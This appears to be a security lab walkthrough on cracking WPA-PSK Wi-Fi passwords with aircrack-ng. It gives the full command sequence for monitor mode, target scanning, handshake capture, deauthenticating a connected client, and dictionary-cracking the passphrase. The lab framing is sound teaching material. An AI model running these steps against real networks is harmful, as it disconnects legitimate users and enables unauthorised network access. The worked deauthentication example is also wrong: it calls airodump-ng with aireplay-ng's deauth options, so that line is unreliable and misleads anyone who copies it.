# WPA-Disruption-and-Cracking

## 1. Overview
This lab will demonstrate a brute force attack against the Wi-Fi Protected Access (WPA) protocol that uses a pre-shared key (PSK). The goal is to authenticate to a wireless access point by disrupting the connection of an existing device, forcing it to re-authenticate.  During the re-authentication process, the client and access point perform a four-way handshake that reveals information about the keys being used.  If this information is collected, a brute-force attack can determine what passphrase generates the authentication keys.

## 2. Environment Setup
- The aircrack-ng tool suite will be utilized for this lab.
- It can be installed on Linux machines with the commands:
  - `sudo apt-get update`
  - `sudo apt-get install -y aircrack-ng`
- MacOS users might consider using the application JamWiFi, which has several comparable tools.
- Its source code is available on GitHub: https://github.com/0x0XDev/JamWiFi

- In order to sniff the authentication packets in this lab, your wireless interface must be set to monitor mode.
- Monitor mode enables a wireless network interface to capture all traffic over a wireless channel.
- Some devices already have wireless adapters that can be set to monitor mode, but others may require an external wireless network adapter.
- An external wireless network adapter will likely require drivers to be installed as well.
- Running the command **iwconfig** can help determine if an interface is in managed mode or in monitor mode.
- Before putting the interface in monitor mode, you may need to kill existing processes with the command:
  - `sudo airmon-ng check kill`
 
- The following commands can then be run to set up the external wireless adapter in monitoring mode.
  - `sudo ifconfig <interface> down`
  - `sudo iwconfig <interface> mode monitor`
  - `sudo ifconfig <interface> up`


## 3. Find and Disrupting the Existing Connection

### 3.1 Identifying the Target
- First, you will need to identify the access point to which you are attempting to connect.
- Run `iwlist <interface> scan` or `airodump-ng <interface>` to find the BSSID (MAC address) of the access point.
  - MacOS users can use JamWiFi’s scan feature.  

### 3.2 Capturing Traffic
- Sniff the four-way authentication handshake
- Capture traffic on the access point’s channel and filter by the BSSID (MAC address) of the access point
  - Use the command: `airodump-ng --bssid <bssid> -c <channel_#> --write <output_file_name> <interface>`
- For example, the following command sniffs channel 6 for any traffic related to the device with the MAC address of 00:25:9c:39:06:72 and writes it to the file capture_wpa:
  - `airodump-ng --bssid 00:25:9c:39:06:72 -c 6 --write capture_wpa wlan0`
- While this command is running, it will also show you the MAC addresses of devices that have already connected to this access point.

### 3.3 Deauthentication
- Use `aireplay-ng` to deauthenticate a client device, forcing it to perform a handshake to reconnect with the access point.
- Use the following command: `aireplay-ng --deauth <#_of_deauth_packets> -a <bssid_of_AP> -c <MAC_address_of_client> <interface>`
- For example, the following command sends 10 deauthentication packets to deauthenticate a client with a MAC address of **00:0f:b5:a1:f3:90** connected to the AP with the MAC address of **00:25:9c:39:06:72**:
  - `airodump-ng --deauth 10 -a 00:25:9c:39:06:72 -c 00:0f:b5:a1:f3:90 wlan0`

## 4. Crack the Password
- View the packets in Wireshark that were sniffed and filter for **EAPOL** packets.
  - **EAPOL** stands for “Extensible Authentication Protocol over LAN”.
  - It is the protocol used to conduct the four-way handshake.
- If the four packets are not found, then retry the steps in task 3 until the handshake packets are successfully captured.

- aircrack-ng will be used to crack the pre-shared key from the authentication handshake packets.
- This will require developing a good cracking dictionary.
- When running aircrack-ng, the following command should be used: `aircrack-ng <packet_capture> -b <bssid> -w <wordlist>`
